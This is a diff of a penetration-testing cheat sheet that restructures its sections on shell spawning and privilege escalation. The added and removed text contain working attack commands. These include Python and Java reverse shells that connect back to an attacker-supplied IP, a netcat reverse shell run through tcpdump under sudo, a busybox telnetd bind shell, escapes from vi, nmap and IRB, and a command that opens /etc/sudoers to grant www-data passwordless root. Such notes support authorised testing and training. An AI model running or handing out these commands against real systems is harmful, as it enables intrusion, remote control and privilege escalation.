@@ -785,32 +785,55 @@ Shells
 -   Netcat Shell Listener  
     nc -nlvp 443
 
--   Shell Spawning - Many of these will also allow you to escape
-    jail shells. The top 3 would be my most successful in general for
-    spawning from the command line.  
-    python -c 'import pty; pty.spawn("/bin/sh")'  
-    echo os.system('/bin/bash')  
-    /bin/sh -i  
-    perl —e 'exec "/bin/sh";'  
-    perl: exec "/bin/sh";  
-    ruby: exec "/bin/sh"  
-    lua: os.execute('/bin/sh')  
-    Java:  
-    r = Runtime.getRuntime()  
-    p = r.exec(\["/bin/bash","-c","exec
-    5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&5 | while read line; do
-    \\$line 2&gt;&5 &gt;&5; done"\] as String\[\])  
-    p.waitFor()  
-    (From within IRB)  
-    exec "/bin/sh"  
-    (From within vi)  
-    :!bash  
-    (From within vi)  
-    :set shell=/bin/bash:shell  
-    (From within nmap)  
-    !sh  
-    from busybox  
-    /bin/busybox telnetd -|/bin/sh -p9999
+-   Spawning a TTY Shell - Break out of Jail or limited shell
+         You should almost always upgrade your shell after taking control of an apache or www user.
+        (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
+        (hint: sudo -l to see what you can run)
+
+     -   python -c 'import pty; pty.spawn("/bin/sh")'
+
+     -   python -c 'import
+         socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);
+         s.connect(("$ip",1234));os.dup2(s.fileno(),0);
+         os.dup2(s.fileno(),1);
+         os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
+
+     -   echo os.system('/bin/bash')
+
+     -   /bin/sh -i
+
+     -   perl —e 'exec "/bin/sh";'
+
+     -   perl: exec "/bin/sh";
+
+     -   ruby: exec "/bin/sh"
+
+     -   lua: os.execute('/bin/sh')
+
+     -   (From within IRB)  
+         exec "/bin/sh"
+
+     -   (From within vi)  
+         :!bash
+
+     -   From within vim  
+         Breaking out of vim is done by ':!bash':
+
+     -   (From within vi)  
+         :set shell=/bin/bash:shell
+
+     -   (From within nmap)  
+         !sh
+
+     -   (From within tcpdump)  
+         echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ &gt;
+         /tmp/.test  
+         chmod +x /tmp/.test  
+         sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst
+         –Z root
+
+     -   from busybox  
+         /bin/busybox telnetd -|/bin/sh -p9999
 
 -   Pen test monkey PHP reverse shell  
     [*http://pentestmonkey.net/tools/web-shells/php-reverse-shel*](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
@@ -912,7 +935,7 @@ Shells
     -   Nmap DNS Fuzzer  
         nmap --script dns-fuzz --script-args timelimit=2h $ip -d
 
-<span id="_x5s578fjasl7" class="anchor"><span id="_Toc480741811" class="anchor"></span></span>File Transfers
+File Transfers
 ============================================================================================================
 
 -   Post exploitation refers to the actions performed by an attacker,
@@ -1085,54 +1108,6 @@ Shells
         echo "int main(void){\\nsetgid(0);
         setuid(0);\\nsystem(\\"/bin/sh\\");\\n}" &gt;privsc.c  
         gcc privsc.c -o privsc
-
-
-    -   Spawning a TTY Shell - Break out of Jail or limited shell
-         You should almost always upgrade your shell after taking control of an apache or www user.
-        (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
-        (hint: sudo -l to see what you can run)
-
-        -   python -c 'import pty; pty.spawn("/bin/sh")'
-
-        -   python -c 'import
-            socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);
-            s.connect(("$ip",1234));os.dup2(s.fileno(),0);
-            os.dup2(s.fileno(),1);
-            os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
-
-        -   echo os.system('/bin/bash')
-
-        -   /bin/sh -i
-
-        -   perl —e 'exec "/bin/sh";'
-
-        -   perl: exec "/bin/sh";
-
-        -   ruby: exec "/bin/sh"
-
-        -   lua: os.execute('/bin/sh')
-
-        -   (From within IRB)  
-            exec "/bin/sh"
-
-        -   (From within vi)  
-            :!bash
-
-        -   From within vim  
-            Breaking out of vim is done by ':!bash':
-
-        -   (From within vi)  
-            :set shell=/bin/bash:shell
-
-        -   (From within nmap)  
-            !sh
-
-        -   (From within tcpdump)  
-            echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ &gt;
-            /tmp/.test  
-            chmod +x /tmp/.test  
-            sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst
-            –Z root
 
 -   Add users to Root SUDO group with no password requirement  
     echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:
